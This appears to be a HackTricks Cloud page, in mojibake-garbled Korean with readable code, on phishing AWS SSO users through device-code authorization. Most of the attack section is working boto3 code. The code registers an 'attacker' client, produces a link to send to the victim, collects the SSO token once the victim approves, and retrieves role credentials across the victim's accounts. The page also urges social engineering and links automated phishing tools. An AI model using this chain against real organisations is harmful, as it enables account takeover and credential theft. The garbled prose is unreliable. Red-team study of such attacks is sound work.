# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## AWS Device Code Phishing

ì²˜ìŒ [**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)ì—ì„œ ì œì•ˆëœ ë°”ì™€ ê°™ì´, AWS SSOë¥¼ ì‚¬ìš©í•˜ëŠ” ì‚¬ìš©ìì—ê²Œ **ë§í¬**ë¥¼ ë³´ë‚´ë©´ **ì‚¬ìš©ìê°€ ìˆ˜ë½**í•  ê²½ìš° ê³µê²©ìëŠ” **ì‚¬ìš©ìë¥¼ ê°€ì¥í•  ìˆ˜ ìˆëŠ” í† í°**ì„ ì–»ê³  **Identity Center**ì—ì„œ ì‚¬ìš©ìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì—­í• ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ì „ì œ ì¡°ê±´ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* í”¼í•´ìëŠ” **Identity Center**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
* ê³µê²©ìëŠ” í”¼í•´ìê°€ ì‚¬ìš©í•˜ëŠ” **ì„œë¸Œë„ë©”ì¸**ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤ `<victimsub>.awsapps.com/start`

ì´ì „ ì •ë³´ë§Œìœ¼ë¡œë„, **ê³µê²©ìëŠ” ì‚¬ìš©ìì—ê²Œ ë§í¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°**, **ìˆ˜ë½**í•  ê²½ìš° **ê³µê²©ìëŠ” AWS ì‚¬ìš©ì** ê³„ì •ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

### Attack

1. **ì„œë¸Œë„ë©”ì¸ ì°¾ê¸°**

ê³µê²©ìì˜ ì²« ë²ˆì§¸ ë‹¨ê³„ëŠ” í”¼í•´ì íšŒì‚¬ê°€ Identity Centerì—ì„œ ì‚¬ìš©í•˜ëŠ” ì„œë¸Œë„ë©”ì¸ì„ ì°¾ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” **OSINT** ë˜ëŠ” **ì¶”ì¸¡ + BF**ë¥¼ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ëŒ€ë¶€ë¶„ì˜ íšŒì‚¬ëŠ” ì—¬ê¸°ì—ì„œ ìì‹ ì˜ ì´ë¦„ì´ë‚˜ ì´ë¦„ì˜ ë³€í˜•ì„ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.

ì´ ì •ë³´ë¥¼ í†µí•´ Identity Centerê°€ êµ¬ì„±ëœ ì§€ì—­ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **í”¼í•´ìë¥¼ ìœ„í•œ ë§í¬ ìƒì„± ë° ì „ì†¡**

ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ í”¼í•´ìê°€ ì¸ì¦í•  ìˆ˜ ìˆë„ë¡ AWS SSO ë¡œê·¸ì¸ ë§í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.\
ë°ëª¨ë¥¼ ìœ„í•´ ì´ ì½”ë“œë¥¼ íŒŒì´ì¬ ì½˜ì†”ì—ì„œ ì‹¤í–‰í•˜ê³  ì¢…ë£Œí•˜ì§€ ë§ˆì‹­ì‹œì˜¤. ë‚˜ì¤‘ì— í† í°ì„ ì–»ê¸° ìœ„í•´ ì¼ë¶€ ê°ì²´ê°€ í•„ìš”í•©ë‹ˆë‹¤:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
ì „ë¬¸ì ì¸ ì†Œì…œ ì—”ì§€ë‹ˆì–´ë§ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±ëœ ë§í¬ë¥¼ í”¼í•´ìì—ê²Œ ë³´ë‚´ì„¸ìš”!

3. **í”¼í•´ìê°€ ìˆ˜ë½í•  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ì„¸ìš”**

í”¼í•´ìê°€ **ì´ë¯¸ AWSì— ë¡œê·¸ì¸í•œ ê²½ìš°** ê¶Œí•œ ë¶€ì—¬ë¥¼ ìˆ˜ë½í•˜ê¸°ë§Œ í•˜ë©´ ë˜ê³ , ë¡œê·¸ì¸í•˜ì§€ ì•Šì€ ê²½ìš° **ë¡œê·¸ì¸í•œ í›„ ê¶Œí•œ ë¶€ì—¬ë¥¼ ìˆ˜ë½í•´ì•¼ í•©ë‹ˆë‹¤**.\
í˜„ì¬ í”„ë¡¬í”„íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSO ì•¡ì„¸ìŠ¤ í† í° ê°€ì ¸ì˜¤ê¸°**

í”¼í•´ìê°€ í”„ë¡¬í”„íŠ¸ë¥¼ ìˆ˜ë½í•˜ë©´, ì´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ **ì‚¬ìš©ìë¥¼ ê°€ì¥í•˜ì—¬ SSO í† í°ì„ ìƒì„±í•˜ì„¸ìš”**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO ì•¡ì„¸ìŠ¤ í† í°ì€ **8ì‹œê°„ ë™ì•ˆ ìœ íš¨í•©ë‹ˆë‹¤**.

5. **ì‚¬ìš©ì ê°€ì¥í•˜ê¸°**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### í”¼ì‹±í•  ìˆ˜ ì—†ëŠ” MFA í”¼ì‹±

ì´ì „ ê³µê²©ì´ **"í”¼ì‹±í•  ìˆ˜ ì—†ëŠ” MFA" (webAuth)ê°€ ì‚¬ìš©ë˜ê³  ìˆì–´ë„ ì‘ë™í•œë‹¤ëŠ” ì‚¬ì‹¤ì€ ì¬ë¯¸ìˆìŠµë‹ˆë‹¤**. ì´ëŠ” ì´ì „ **ì›Œí¬í”Œë¡œìš°ê°€ ì‚¬ìš©ëœ OAuth ë„ë©”ì¸ì„ ë²—ì–´ë‚˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤**. ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ ë„ë©”ì¸ì„ ëŒ€ì²´í•´ì•¼ í•˜ëŠ” ë‹¤ë¥¸ í”¼ì‹± ê³µê²©ê³¼ëŠ” ë‹¬ë¦¬, ì¥ì¹˜ ì½”ë“œ ì›Œí¬í”Œë¡œìš°ëŠ” **ì½”ë“œê°€ ì¥ì¹˜ì— ì˜í•´ ì•Œë ¤ì§€ë„ë¡ ì¤€ë¹„ë˜ì–´** ìˆìœ¼ë©°, ì‚¬ìš©ìëŠ” ë‹¤ë¥¸ ê¸°ê¸°ì—ì„œë„ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í”„ë¡¬í”„íŠ¸ë¥¼ ìˆ˜ë½í•˜ë©´, ì¥ì¹˜ëŠ” **ì´ˆê¸° ì½”ë“œë¥¼ ì•Œê³  ìˆê¸°ë§Œ í•˜ë©´** ì‚¬ìš©ìì˜ **ìê²© ì¦ëª…ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ìì„¸í•œ ì •ë³´ëŠ” [**ì´ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”**](https://mjg59.dreamwidth.org/62175.html).

### ìë™ ë„êµ¬

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## ì°¸ê³  ë¬¸í—Œ

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
